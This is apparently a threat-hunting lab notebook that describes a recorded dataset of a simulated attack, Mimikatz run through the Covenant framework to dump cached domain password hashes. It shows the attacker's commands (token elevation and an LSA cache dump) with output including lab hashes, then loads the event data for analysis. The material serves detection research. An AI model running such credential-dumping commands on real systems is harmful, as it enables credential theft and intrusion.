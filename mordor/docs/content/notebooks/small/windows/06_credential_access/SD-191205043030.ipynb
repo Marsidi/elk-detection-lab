{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Covenant Mimikatz LSA Cache"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-191205043030 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2019/12/05 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Covenant |\n",
    "| Simulation Script | https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Mimikatz.cs |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/covenant_lsacache.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries using Mimikatz to exract cached password hashes from HKEY_LOCAL_MACHINE\\SECURITY\\Cache"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    ".#####.   mimikatz 2.2.0 (x64) #18362 Oct  8 2019 14:30:39\n",
    ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n",
    "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    "## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    " '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "mimikatz(powershell) # token::elevate\n",
    "Token Id  : 0\n",
    "User name : \n",
    "SID name  : NT AUTHORITY\\SYSTEM\n",
    "\n",
    "760\t{0;000003e7} 1 D 26049     \tNT AUTHORITY\\SYSTEM\tS-1-5-18\t(04g,21p)\tPrimary\n",
    "  -> Impersonated !\n",
    "  * Process Token : {0;000764fd} 1 F 7191206   \tshire\\pgustavo\tS-1-5-21-791464340-1796667228-2788435825-1112\t(17g,24p)\tPrimary\n",
    "  * Thread Token  : {0;000003e7} 1 D 8355744   \tNT AUTHORITY\\SYSTEM\tS-1-5-18\t(04g,21p)\tImpersonation (Delegation)\n",
    "\n",
    "mimikatz(powershell) # lsadump::cache\n",
    "Domain : IT001\n",
    "SysKey : 4723683e5d919d0170ffd5a4c2b137fa\n",
    "\n",
    "Local name : IT001 ( S-1-5-21-2036226717-1704707055-511440364 )\n",
    "Domain name : shire ( S-1-5-21-791464340-1796667228-2788435825 )\n",
    "Domain FQDN : shire.com\n",
    "\n",
    "Policy subsystem is : 1.18\n",
    "LSA Key(s) : 1, default {8b36cbca-d3e7-f8bc-d903-ff9728f21c92}\n",
    "  [00] {8b36cbca-d3e7-f8bc-d903-ff9728f21c92} db4d026436543ae43b751a1085e7dbe6e560be5dc2ed67e326aefb1c79127025\n",
    "\n",
    "* Iteration is set to default (10240)\n",
    "\n",
    "[NL$1 - 12/4/2019 8:02:03 PM]\n",
    "RID       : 00000458 (1112)\n",
    "User      : shire\\pgustavo\n",
    "MsCacheV2 : 4d335711a0a835a152e2783a51dfb92c\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/covenant_lsacache.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
